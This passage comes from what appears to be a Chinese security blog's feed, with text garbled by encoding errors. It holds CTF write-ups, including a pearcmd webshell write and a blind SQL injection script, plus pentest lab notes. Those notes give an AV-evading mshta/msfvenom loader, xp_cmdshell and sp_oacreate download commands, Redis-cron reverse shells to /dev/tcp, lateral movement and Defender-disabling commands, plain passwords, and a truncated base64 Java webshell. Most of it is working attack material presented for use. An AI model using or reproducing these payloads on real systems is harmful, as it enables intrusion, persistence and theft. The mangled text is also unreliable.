class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰“phpinfoçš„æ—¶å€™ï¼Œæ˜¯å­˜åœ¨å‡flagçš„çš„ï¼Œfake{Check_register_argc_argv}ï¼Œè®©æ‰“è¿™ä¸ªregister_argc_argvå‡½æ•°</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127153538006.png" alt="image-20231127153538006"></p><p>ç»å…¸æ‰“æ³•ï¼Œçœ‹è¿™å‡½æ•°æ˜¯å¦æ˜¯on</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127153719625.png" alt="image-20231127153719625"></p><p>ç›´æ¥pocæ‰“ï¼Œå†™å…¥æ–‡ä»¶å³å¯ï¼Œ<code>/?file=/usr/local/lib/php/pearcmd&amp;aaaa+config-create+/var/www/html/&lt;?=eval($_POST[1]);?&gt;+32.php</code></p><p>è¯¦ç»†è§å¤§å¸ˆå‚…åšå®¢<code>https://cloud.tencent.com/developer/article/2204400?areaId=106001</code></p><p>å³å¯å†™å…¥webshellï¼Œå»ºè®®burpä¸­æ‰“ï¼Œä¸ç„¶å®¹æ˜“ä¹±ç ã€‚</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127153922543.png" alt="image-20231127153922543"></p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127153942182.png" alt="image-20231127153942182"></p><h5 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h5><p>å¥½åƒå’Œä¸Šå‘¨çš„ä¸€æ ·ï¼Œå¤§å°å†™ç»•è¿‡å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥æ‰€éœ€æ¨¡å—</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€ å­—æ¯è¡¨ï¼Œæ ¹æ®å­—æ¯è¡¨å»çˆ†ç ´æ¯ä¸€ä½çš„å…·ä½“å€¼</span></span><br><span class="line">alphabet = <span class="string">&quot;-,&#125;&#123;_=&quot;</span> + string.ascii_letters + string.digits</span><br><span class="line"><span class="built_in">print</span>(alphabet)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é¢˜ç›®çš„URL</span></span><br><span class="line">url = <span class="string">&quot;http://eacaf619-8013-4e77-b7fb-608613da574e.node4.buuoj.cn:81/?id=TMP11503&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨å…¥ä»€ä¹ˆæ•°æ®ï¼Œselectå˜é‡å°±å†™ä»€ä¹ˆå­æŸ¥è¯¢è¯­å¥</span></span><br><span class="line">select = <span class="string">&quot;select database()&quot;</span> </span><br><span class="line">select = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span> <span class="comment">#è·å–æ‰€æœ‰åº“å</span></span><br><span class="line">select = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;&quot;</span> <span class="comment">#è·å–è¡¨å</span></span><br><span class="line">select = <span class="string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctf&#x27; and table_name=&#x27;here_is_flag&#x27;&quot;</span><span class="comment">#è·å–å­—æ®µå</span></span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select flag from ctf.here_is_flag&quot;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨æ¥ä¿å­˜æ³¨å…¥å‡ºçš„ç»“æœ</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>): <span class="comment"># å¤–å±‚å¾ªç¯ï¼Œä»1å¼€å§‹ï¼Œå› ä¸ºæˆªå–çš„ä½æ•°æ˜¯ä»1å¼€å§‹çš„</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> alphabet: <span class="comment"># å†…å±‚å¾ªç¯ï¼Œæ˜¯å…·ä½“éœ€è¦æµ‹è¯•çš„å€¼</span></span><br><span class="line">        <span class="comment"># æ„é€ SQLè¯­å¥ï¼Œå‘èµ·è¯·æ±‚</span></span><br><span class="line">        <span class="comment">#payload = f&quot;&#x27; AND subStr((selEct database()) ,&#123;i&#125;,1) = &#x27;&#123;ch&#125;&#x27; AND &#x27;YSGl&#x27;=&#x27;YSGl&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;&#x27; AND subStr((SELECT flag FROM here_is_flag) ,<span class="subst">&#123;i&#125;</span>,1) = &#x27;<span class="subst">&#123;ch&#125;</span>&#x27; AND &#x27;YSGl&#x27;=&#x27;YSGl&quot;</span></span><br><span class="line">        r = requests.get(url=url+payload)</span><br><span class="line">        <span class="comment"># æ ¹æ®å›æ˜¾åˆ¤æ–­ï¼Œå¦‚æœå¾—åˆ°äº†è¡¨ç¤ºæŸ¥è¯¢æˆåŠŸçš„å›æ˜¾ï¼Œé‚£ä¹ˆè¯´æ˜åˆ¤æ–­æ•°æ®çš„è¿™ä¸€ä½æ˜¯æ­£ç¡®çš„</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(ch) &lt; <span class="number">66</span> : </span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;class_name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            result += ch </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ³¨å…¥æˆåŠŸï¼š&quot;</span>, result)</span><br><span class="line">            <span class="comment">#print(url+payload)</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span> <span class="comment"># è¿™ä¸€ä½å·²ç»è·‘å‡ºæ¥äº†ï¼Œå¯ä»¥breakæ‰ç„¶åä¸‹ä¸€è½®å¾ªç¯è·‘ä¸‹ä¸€ä½æ•°æ®äº†</span></span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127161313732.png" alt="image-20231127161313732"></p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="é˜³å…‰å¼€æœ—å¤§ç”·å­©"><a href="#é˜³å…‰å¼€æœ—å¤§ç”·å­©" class="headerlink" title="é˜³å…‰å¼€æœ—å¤§ç”·å­©"></a>é˜³å…‰å¼€æœ—å¤§ç”·å­©</h5><p>ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼ç +emoji-aes<br><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127163200996.png" alt="image-20231127163200996"></p><p>æ‹¿åˆ°passwdï¼Œç›´æ¥è§£å³å¯<code>https://aghorler.github.io/emoji-aes/</code></p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127163222217.png" alt="image-20231127163222217"></p><h5 id="å¤§æ€¨ç§"><a href="#å¤§æ€¨ç§" class="headerlink" title="å¤§æ€¨ç§"></a>å¤§æ€¨ç§</h5><p>gifé‡Œé¢æœ‰äºŒç»´ç ï¼Œç”¨stegsolveå³å¯ï¼Œç‚¹å‡»analyse-&gt;framebrowserï¼Œå·¦å³ç‚¹ç‚¹å³å¯ã€‚</p><p>æ˜¯ä¸€ä¸ªæ±‰ä¿¡ç ï¼Œç™¾åº¦æ±‰ä¿¡ç è§£ç æ‰¾ä¸€ä¸ªï¼Œ<img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127163841521.png" alt="image-20231127163841521"></p><h5 id="2-åˆ†æ"><a href="#2-åˆ†æ" class="headerlink" title="2-åˆ†æ"></a>2-åˆ†æ</h5><p>ä½†ä½ å¿ƒä¸­ä»ç„¶æœ‰ä¸€ç§ä¸ç¥¥çš„é¢„æ„Ÿï¼Œè¿™æ—¶ä½ çš„åŒäº‹å‘Šè¯‰ä½ è¿™å°æœåŠ¡å™¨å·²ç»è¢«æ”»å‡»è€…è·å–åˆ°äº†æƒé™ï¼Œéœ€è¦ä½ å°½å¿«å»è¿˜åŸæ”»å‡»è€…çš„æ”»å‡»è·¯å¾„ï¼Œè°ƒæŸ¥æ¸…æ¥šæ”»å‡»è€…æ˜¯å¦‚ä½•è·å–åˆ°æœåŠ¡å™¨æƒé™çš„ã€‚ï¼›FLAGæ ¼å¼flag{md5(æ”»å‡»è€…ç™»å½•ä½¿ç”¨çš„ç”¨æˆ·å_å­˜åœ¨æ¼æ´çš„æ–‡ä»¶å_WebShellæ–‡ä»¶å)}ï¼›ä¾‹å¦‚flag{testuser_123.php_shell.php}ï¼Œå°†æ‹¬å·å†…çš„å†…å®¹è¿›è¡Œmd5ç¼–ç å¾—åˆ°flag{58aec571c731faae1369b461d3927596}å³ä¸ºéœ€è¦æäº¤çš„Flag</p><p>``http.request.method==â€POSTâ€`ç™»å½•çš„è¯ç›´æ¥è¿‡æ»¤postæ–¹å¼ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127164806365.png" alt="image-20231127164806365"></p><p>302è¯´æ˜æˆåŠŸï¼Œuserå°±æ˜¯best_admin</p><p>ç„¶åç­›é€‰é©¬å­ï¼Œæ­£å¸¸ä¸Šä¼ æ–‡ä»¶ä¹Ÿæ˜¯POSTï¼Œä½†æ˜¯è¿™æ¬¡ä¸æ˜¯ï¼Œæˆ‘æ²¡å¯ä»¥<code>http.response.code!=404</code>å› ä¸ºé‡Œé¢æœ‰å¾ˆå¤šæ‰«æçš„ä¿¡æ¯ï¼Œæ‰§è¡Œå‘½ä»¤è‚¯å®šæœ‰å›æ˜¾ï¼Œæ‰€ä»¥ä»ä¸‹ç‚¹ç‚¹çœ‹å›æ˜¾åŒ…ï¼Œè¿™é‡Œæ³¨æ„404ä¸è¦åŠ å¼•å·<img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127170220126.png" alt="image-20231127170220126"></p><p>å¯ä»¥çœ‹åˆ°åœ¨index.phpï¼Œæ‰§è¡Œäº†getå‘½ä»¤ï¼Œæ‰“äº†getçš„é©¬å­ï¼Œé‚£ä¹ˆ</p><p>flag=best_admin_index.php_wh1t3g0d.phpçš„md5=4069afd7089f7363198d899385ad688b</p><h5 id="medium-sql-1"><a href="#medium-sql-1" class="headerlink" title="medium_sql"></a>medium_sql</h5><h5 id="medium-sql-2"><a href="#medium-sql-2" class="headerlink" title="medium_sql"></a>medium_sql</h5>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlserverä¸Šçº¿csormsf</title>
      <link href="/2023/11/26/sqlserver%E4%B8%8A%E7%BA%BFcsormsf/"/>
      <url>/2023/11/26/sqlserver%E4%B8%8A%E7%BA%BFcsormsf/</url>
      
        <content type="html"><![CDATA[<p>å½“æˆ‘æ²¡æ‹¿åˆ°ä¸€ä¸ªsqlserverçš„æƒé™æ—¶ï¼Œæƒé™å¾ˆå°ï¼Œä¸”æœ‰wafçš„æƒ…å†µä¸‹ï¼Œä¸”åªèƒ½é€è¿‡webæ‰§è¡Œå‘½ä»¤ï¼Œä¸Šçº¿åˆ°msfæˆ–è€…csã€‚</p><p><img src="/images/others/image-20231126153013346.png" alt="image-20231126153013346"></p><p>å…ˆçœ‹ä¸€ä¸‹æ€è½¯</p><p><img src="/images/others/image-20231126153201821.png" alt="image-20231126153201821"></p><p>å¾ˆå¤šï¼Œè¿˜æœ‰å›½å¤–çš„ã€‚</p><p>è¿™é‡Œé‡‡ç”¨mshtaå…æ€ä¸Šçº¿ï¼Œå‚è€ƒæ–‡ç« <code>https://www.zhihuifly.com/t/topic/2534</code></p><p>é¦–å…ˆæ•´ä¸ªæ¨¡æ¿æ–‡ä»¶<a href="https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta%EF%BC%8C%E5%9C%A8%E8%BF%99%E4%B8%AA%E9%87%8C%EF%BC%8C">https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.htaï¼Œåœ¨è¿™ä¸ªé‡Œï¼Œ</a></p><p>ç„¶åä½¿ç”¨cs æˆ–è€…msfç”Ÿæˆä¸€ä¸ªraw æ–‡ä»¶</p><p><code>msfvenom -a x86 -p windows/meterpreter/reverse_https LHOST=10.211.55.2 LPORT=3333 -f raw -o payload.bin</code></p><p>cs  attacks</p><p><img src="/images/others/image-20231126154223169.png" alt="image-20231126154223169"></p><p>è¿™é‡Œæ³¨æ„æ˜¯32ä½çš„</p><p>ç„¶å<code>cat payload.bin | base64 -w 0</code></p><p><img src="/images/others/image-20231126153450897.png" alt="image-20231126153450897"></p><p>æŠŠå¾—åˆ°çš„å†…å®¹å†™è¿›æ¨¡æ¿é‡Œ</p><p><img src="/images/others/image-20231126154351504.png" alt="image-20231126154351504"></p><p>ç„¶åèµ·ä¸€ä¸ªpythonæœåŠ¡å™¨å³å¯ï¼Œ</p><p>msfçš„è¦èµ·ç›‘å¬</p><p>use exploit/multi/handler</p><p>payload æ¢æ‰  set payload windows/meterpreter/reverse_https</p><p>æ‰§è¡Œå‘½ä»¤å³å¯</p><p><code>mshta http://ip:port/msta.hta</code></p><p><img src="/images/others/image-20231126154622099.png" alt="image-20231126154622099"></p><p><img src="/images/others/image-20231126154730372.png" alt="image-20231126154730372"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cmd= <span class="string">&quot;;DECLARE @er VARCHAR(8000);SET @er=0x16è¿›åˆ¶;EXEC master..xp_cmdshell @er&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd2=<span class="string">&quot;declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami&#x27;&quot;</span></span><br><span class="line">cmd3=<span class="string">&quot;declare @o int exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\Windows\System32\certutil.exe&#x27; ,&#x27;c:\windows\temp\sethc.exe&#x27;;&quot;</span></span><br><span class="line">cmd4=<span class="string">&quot;declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\sethc.exe -urlcache -split -f &#x27;http://ip:port/SKXT.exe&#x27; C:\Windows\Temp\shell.exe&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd11=<span class="string">&quot;exec sp_configure &#x27;show advanced options&#x27;, 1;  RECONFIGURE;  exec sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  RECONFIGURE;&quot;</span></span><br><span class="line">cmd12=<span class="string">&quot;declare @o int exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\\Windows\\System32\\certutil.exe&#x27; ,&#x27;c:\\windows\\temp\\sethc.exe&#x27;;&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
            <tag> cs </tag>
            
            <tag> sqlserver </tag>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cfs</title>
      <link href="/2023/11/17/cfs/cfs/"/>
      <url>/2023/11/17/cfs/cfs/</url>
      
        <content type="html"><![CDATA[<p>rootå¯†ç ï¼šteamssix.com</p><p>æ­¤ä¸»æœºçš„IPåœ°å€ï¼š<br>192.168.1.11<br>192.168.22.11</p><p>å®å¡”åå°ç™»é™†åœ°å€åŠå¯†ç ï¼š<br>åœ°å€ï¼š<a href="http://192.168.1.11:8888/a768f109/">http://192.168.1.11:8888/a768f109/</a><br>è´¦å·ï¼šeaj3yhsl<br>å¯†ç ï¼š41bb8fee</p><p>rootå¯†ç ï¼šteamssix.com</p><p>æ­¤ä¸»æœºçš„IPåœ°å€ï¼š<br>192.168.22.22<br>192.168.33.22</p><p>å®å¡”åå°ç™»é™†åœ°å€åŠå¯†ç ï¼š<br>åœ°å€ï¼š<a href="http://192.168.22.22:8888/2cc52ec0/">http://192.168.22.22:8888/2cc52ec0/</a><br>è´¦å·ï¼šxdynr37d<br>å¯†ç ï¼š123qwe..</p><p>GET /index.php?r=vul&amp;keyword=1â€™ union%20select%20database(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39â€“%20123<br><a href="http://192.168.22.129/index.php?r=vul&amp;keyword=1&#39;">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#39;</a> union select databases(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39â€“ 123<br>GET /index.php?r=vul&amp;keyword=1â€™ union select database(),1,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39  from information_schema.tables where table_schema=â€™bagecmsâ€™â€“%2012<br>bage_ad,bage_admin,bage_admin_group,bage_admin_logger,bage_attr,bage_attr_val,bage_catalog,bage_config,bage_link,bage_page,bage_post,bage_post_2tags,bage_post_album,bage_post_comment,bage_post_tags,bage_question,bage_special,bage_upload</p><p>id,username,password,realname,group_id,email,qq,notebook,mobile,telephone,last_login_ip,last_login_time,login_count,status_is,create_time<br>GET /index.php?r=vul&amp;keyword=1â€™ union select database(),1,1,id,username,password,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39 from bagecms.bage_adminâ€“%20123 HTTP/1.1<br>Array<br>(<br>    [0] =&gt; Post Object<br>        (<br>            [_new:CActiveRecord:private] =&gt;<br>            [_attributes:CActiveRecord:private] =&gt; Array<br>                (<br>                    [id] =&gt; bagecms<br>                    [user_id] =&gt; 1<br>                    [nickname] =&gt; 1<br>                    [author] =&gt; 1<br>                    [title] =&gt; admin<br>                    [title_second] =&gt; 46f94c8de14fb36680850768ff1b7f2a<br>123qwe</p><p>./ew -s lcx_tran -l 17777 -f 192.168.22.129 -g 17775 -t 1000000<br>./ew -s ssocksd -l 17775 -t 1000000</p><p>ä¸­é—´æœºå™¨<br>./ew -s lcx_slave -d 192.168.144.142 -e 37779 -f 192.168.33.33 -g 39999 -t 100000</p><p>å·¦è¾¹æœºå™¨<br>./ew -s lcx_listen -l 37777 -e 37779 -t 100000</p><p>å³è¾¹æœºå™¨<br>.\ew_for_Win.exe -s ssocksd -l 39999 -t 100000</p><p>setg Proxies socks5:ip2:8321 è®¾ç½®å…¨å±€ä»£ç†<br>set ReverseAllowProxy true è¿™ä¸ªå‚æ•°æ˜¯å› ä¸ºä½¿ç”¨å…¨å±€ä»£ç†ï¼Œå¯èƒ½ä¼šå¯¼è‡´æˆ‘ä»¬çš„shellæ— æ³•åå¼¹ï¼Œæ‰€ä»¥éœ€è¦å¼€å¯ã€‚<br>ip2:8321</p><p>ä¸­é—´zuoæœºå™¨<br>./ew -s lcx_slave -d 192.168.144.142 -e 37779 -f 192.168.33.33 -g 39998 -t 100000</p><p>ä¸­é—´youæœºå™¨<br>.\ew_for_Win.exe -s lcx_slave -d 192.168.22.129 -e 39998 -f 192.168.44.130 -g 39989 -t 100000<br>.\ew_for_Win.exe -s lcx_slave -d 192.168.33.128 -e 39998 -f 192.168.44.130 -g 39989 -t 100000<br>å·¦è¾¹æœºå™¨<br>./ew -s lcx_listen -l 37777 -e 37779 -t 100000</p><p>å³è¾¹æœºå™¨<br>.\ew_for_Win.exe -s ssocksd -l 39989 -t 100000</p><p>proxychains nmap -Pn -sT -T4 -F 192.168.88.100</p><p>8A..;123admin</p><p>dynamic_chain ï¼šåŠ¨æ€æ¨¡å¼,æŒ‰ç…§ä»£ç†åˆ—è¡¨é¡ºåºè‡ªåŠ¨é€‰å–å¯ç”¨ä»£ç†<br>strict_chain ï¼šä¸¥æ ¼æ¨¡å¼,ä¸¥æ ¼æŒ‰ç…§ä»£ç†åˆ—è¡¨é¡ºåºä½¿ç”¨ä»£ç†ï¼Œæ‰€æœ‰ä»£ç†å¿…é¡»å¯ç”¨<br>round_robin_chain ï¼šè½®è¯¢æ¨¡å¼ï¼Œè‡ªåŠ¨è·³è¿‡ä¸å¯ç”¨ä»£ç†<br>random_chain ï¼šéšæœºæ¨¡å¼,éšæœºä½¿ç”¨ä»£ç†</p><p>administrator/admin@123</p><p>vulntarget\win2008<br>qweASD123</p><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminalâ€ â€œServer /v fDenyTSConnections /t REG_DWORD /d 0 /f</p><p>netsh advfirewall set allprofiles state off</p><p>set-MpPreference -DisableRealtimeMonitoring $true</p><p>dir \WIN-1PV25H8UJPN.vulntarget.com dir<br>schtasks /create /s WIN-1PV25H8UJPN.vulntarget.com /tn test /sc minute /mo 1 /tr â€œC:\Windows\System32\cmd.exe /c â€˜whoami &gt; C:\Users\Administrator\result.txtâ€™â€ /ru system /f<br>dir \WIN-1PV25H8UJPN.vulntarget.com\C$<br>C:\Users\Administrator\Desktop\PSTools&gt;PsExec.exe -accepteula \WIN-1PV25H8UJPN cmd.exe</p><p>set xxoo â€œ\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.16.100.21/10001 0&gt;&amp;1\n\nâ€</p><p>proxychains echo -e â€œ\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.16.100.21/1234 0&gt;&amp;1\n\nâ€|redis-cli -h 172.17.20.250 -a 123456 -x set 1<br>proxychains redis-cli -h 172.17.20.250 -a 123456 config set dir /var/spool/cron/<br>proxychains redis-cli -h 172.17.20.250 -a 123456 config set dbfilename redis<br>proxychains redis-cli -h 172.17.20.250 -a 123456 save</p><p>nc -l -p 1234 -vv</p><p>/ /<em>\_</em><strong><em>_</em> \ (</strong>| | | (<em>| | (<strong>|   &lt;<br>_</strong></em>/     |<em><strong>/_</strong>|</em>|  _<em>,</em>|__<em>|</em>|_<br>                     fscan version: 1.6.3<br>start infoscan<br>(icmp) Target â€˜172.17.20.1â€™ is alive<br>(icmp) Target â€˜172.17.20.10â€™ is alive<br>(icmp) Target â€˜172.17.20.110â€™ is alive<br>(icmp) Target â€˜172.17.20.250â€™ is alive<br>(icmp) Target â€˜172.17.20.113â€™ is alive<br>icmp alive hosts len is: 5<br>172.17.20.110:7001 open</p><p>172.17.20.250:6379 open<br>172.17.20.250:3306 open</p><p>172.17.20.113:445 open<br>172.17.20.113:139 open</p><p>172.17.20.250:22 open<br>172.17.20.113:135 open<br>172.17.20.113:80 open</p><p>172.17.20.10:80 open</p><p>172.17.20.10:22 open<br>172.17.20.10:443 open<br>172.17.20.1:3000 open<br>alive ports len is: 12<br>start vulscan<br>[+] Redis:172.17.20.250:6379 123456<br>[+] Redis:172.17.20.250:6379 like can write /var/spool/cron/<br>NetInfo:<br>[<em>]172.17.20.113<br>   [-&gt;]WIN-MS7AC966K31<br>   [-&gt;]172.17.20.113<br>[</em>] WebTitle:<a href="http://172.17.20.113/">http://172.17.20.113</a>      code:200 len:39     title:Office Anywhere 2017ç‰ˆ ç½‘ç»œæ™ºèƒ½åŠå…¬ç³»ç»Ÿ<br>[<em>] 172.17.20.113        WORKGROUP\WIN-MS7AC966K31   Windows Server 2012 R2 Standard 9600<br>[+] InfoScan:<a href="http://172.17.20.113/">http://172.17.20.113</a>      [é€šè¾¾OA]<br>[</em>] WebTitle:<a href="http://172.17.20.10/">http://172.17.20.10</a>       code:200 len:7      title:Meetsec<br>[*] WebTitle:<a href="https://172.17.20.10/">https://172.17.20.10</a>      code:200 len:7      title:Meetsec</p><p>/home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war</p><p>bash -i &gt;&amp; /dev/tcp/172.16.100.21/10002 0&gt;&amp;1</p><p>echo PCUhIFN0cmluZyB4Yz0iM2M2ZTBiOGE5YzE1MjI0YSI7IFN0cmluZyBwYXNzPSJwYXNzIjsgU3RyaW5nIG1kNT1tZDUocGFzcyt4Yyk7IGNsYXNzIFggZXh0ZW5kcyBDbGFzc0xvYWRlcntwdWJsaWMgWChDbGFzc0xvYWRlciB6KXtzdXBlcih6KTt9cHVibGljIENsYXNzIFEoYnl0ZVtdIGNiKXtyZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoY2IsIDAsIGNiLmxlbmd0aCk7fSB9cHVibGljIGJ5dGVbXSB4KGJ5dGVbXSBzLGJvb2xlYW4gbSl7IHRyeXtqYXZheC5jcnlwdG8uQ2lwaGVyIGM9amF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KG0/MToyLG5ldyBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjKHhjLmdldEJ5dGVzKCksIkFFUyIpKTtyZXR1cm4gYy5kb0ZpbmFsKHMpOyB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXtyZXR1cm4gbnVsbDsgfX0gcHVibGljIHN0YXRpYyBTdHJpbmcgbWQ1KFN0cmluZyBzKSB7U3RyaW5nIHJldCA9IG51bGw7dHJ5IHtqYXZhLnNlY3VyaXR5Lk1lc3NhZ2VEaWdlc3QgbTttID0gamF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0LmdldEluc3RhbmNlKCJNRDUiKTttLnVwZGF0ZShzLmdldEJ5dGVzKCksIDAsIHMubGVuZ3RoKCkpO3JldCA9IG5ldyBqYXZhLm1hdGguQmlnSW50ZWdlcigxLCBtLmRpZ2VzdCgpKS50b1N0cmluZygxNikudG9VcHBlckNhc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge31yZXR1cm4gcmV0OyB9IHB1YmxpYyBzdGF0aWMgU3RyaW5nIGJhc2U2NEVuY29kZShieXRlW10gYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtTdHJpbmcgdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldEVuY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlVG9TdHJpbmciLCBuZXcgQ2xhc3NbXSB7IGJ5dGVbXS5jbGFzcyB9KS5pbnZva2UoRW5jb2RlciwgbmV3IE9iamVjdFtdIHsgYnMgfSk7fSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt0cnkgeyBiYXNlNjQ9Q2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RW5jb2RlciIpOyBPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5uZXdJbnN0YW5jZSgpOyB2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlIiwgbmV3IENsYXNzW10geyBieXRlW10uY2xhc3MgfSkuaW52b2tlKEVuY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlMikge319cmV0dXJuIHZhbHVlOyB9IHB1YmxpYyBzdGF0aWMgYnl0ZVtdIGJhc2U2NERlY29kZShTdHJpbmcgYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtieXRlW10gdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgZGVjb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldERlY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChieXRlW10pZGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgbmV3IENsYXNzW10geyBTdHJ